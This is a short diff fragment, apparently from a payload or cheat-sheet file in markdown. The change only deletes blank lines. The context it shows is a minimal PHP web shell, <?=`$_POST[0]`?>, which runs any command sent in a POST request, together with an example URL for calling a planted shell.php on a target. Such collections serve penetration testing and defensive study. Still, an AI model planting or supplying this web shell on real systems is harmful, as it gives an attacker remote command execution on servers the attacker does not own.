@@ -7,7 +7,5 @@
 - http://target.com/path/to/shell.php?0=command
 
 <?=`$_POST[0]`?>
-
-
 ```
 
